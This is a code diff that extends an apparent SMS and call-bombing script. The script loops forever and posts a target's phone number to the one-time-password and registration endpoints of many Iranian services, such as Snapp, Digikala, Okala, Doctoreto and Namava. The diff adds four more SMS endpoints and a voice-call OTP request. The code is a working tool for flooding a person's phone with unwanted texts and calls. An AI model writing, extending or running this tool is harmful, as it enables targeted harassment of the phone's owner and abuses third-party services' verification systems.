@@ -63,6 +63,8 @@ while True:
         'Accept': '*/*'
     }
 
+    ### SMS APIs ###
+
     # Snapp
     snapp_url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
     snapp_payload = {'cellphone': '+98'+number}
@@ -272,7 +274,7 @@ while True:
     safirstores_req = requests.post(safirstores_url, data=safirstores_payload, json=rhead)
     print('SafirStores: ' + str(safirstores_req.status_code))
 
-    #Digikala
+    # Digikala
     digikala_url = 'https://api.digikala.com/v1/user/authenticate/'
     digikala_payload = {
         'backUrl': '/',
@@ -282,13 +284,13 @@ while True:
     digikala_req = requests.post(digikala_url, json=digikala_payload, headers=rhead)
     print('Digikala: '+str(digikala_req.status_code))
 
-    #Mobit
+    # Mobit
     mobit_url = 'https://api.mobit.ir/api/web/v8/register/register'
     mobit_payload = {'number': '0'+number}
     mobit_req = requests.post(mobit_url, json=mobit_payload, headers=rhead)
     print('Mobit: '+str(mobit_req.status_code))
 
-    #Okala
+    # Okala
     okala_url = 'https://api-react.okala.com/C/CustomerAccount/OTPRegister'
     okala_payload = {
         'mobile': '0'+number,
@@ -298,5 +300,44 @@ while True:
     }
     okala_req = requests.post(okala_url, json=okala_payload, headers=rhead)
     print('Okala: '+str(okala_req.status_code))
+
+    # Doctoreto
+    doctoreto_url = 'https://api.doctoreto.com/api/web/patient/v1/accounts/register'
+    doctoreto_payload = {
+        "country_id": 205,
+        "mobile": number
+    }
+    doctoreto_req = requests.post(doctoreto_url, json=doctoreto_payload, headers=rhead)
+    print('Doctoreto: '+str(doctoreto_req.status_code))
+
+    # SnappDoctor
+    snappdoctor_url = f'https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/0{number}/sms'
+    snappdoctor_params = {'cCode': '+98'}
+    snappdoctor_req = requests.get(snappdoctor_url, params=snappdoctor_params, json=rhead)
+    print('SnappDoctor: ' + str(snappdoctor_req.status_code))
+
+    # SnappApps
+    snappapps_url = 'https://api.snapp.ir/api/v1/sms/link'
+    snappapps_payload = {"phone":"0"+number}
+    snappapps_req = requests.post(snappapps_url, json=snappapps_payload, headers=rhead)
+    print('SnappApps: '+str(snappapps_req.status_code))
+
+    # Namava
+    namava_url = 'https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request'
+    namava_payload = {"UserName":"+98"+number}
+    namava_req = requests.post(namava_url, json=namava_payload, headers=rhead)
+    print('Namava: '+str(namava_req.status_code))
+
+    ### Call APIs ###
+
+    # digikalacall
+    digikalacall_url = 'https://api.digikala.com/v1/user/authenticate/'
+    digikalacall_payload = {
+        'backUrl': '/',
+        'username': '0'+number,
+        'otp_call': 'true'
+    }
+    digikalacall_req = requests.post(digikalacall_url, json=digikalacall_payload, headers=rhead)
+    print('digikalacall: '+str(digikalacall_req.status_code))
 
     sleep(2)
